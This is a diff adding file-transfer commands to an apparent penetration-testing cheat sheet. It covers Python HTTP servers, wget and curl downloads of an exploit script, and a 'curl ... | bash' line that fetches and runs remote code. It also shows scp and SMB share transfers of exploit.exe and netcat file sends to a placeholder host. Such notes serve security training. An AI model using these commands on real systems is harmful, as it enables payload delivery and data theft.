@@ -775,6 +775,28 @@ C:\> nc.exe -nlvp 443 < file.txt
 $ nc -nv <IP address> 443 > file.txt
 ```
 
+- Python Server (Kali -> Windows/Kali)
+
+```
+$ python -m SimpleHTTPServer 80
+$ python3 -m http.server 8000
+$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
+$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
+$ curl http://<IP address>:8000/exploit.sh | bash
+```
+
+- SCP Downloads (Kali -> Windows)
+
+```
+$ scp <user>@<IP address>:/tmp/exploit.exe C:\Temp\exploit.exe
+```
+
+- SCP Uploads (Windows -> Kali)
+
+```
+C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
+```
+
 - PowerShell DownloadFile (Kali -> Windows)
 
 ```
@@ -825,6 +847,8 @@ $ echo <base64> | base64 -d -w 0 > hosts
 $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 C:\> net use n: \\<IP address>\smbshare /user:test test
 C:\> copy n:\exploit.exe
+OR
+$ smbserver.py a /usr/share/windows-binaries/
 ```
 
 - SMB Uploads WebDav (Windows -> Kali)
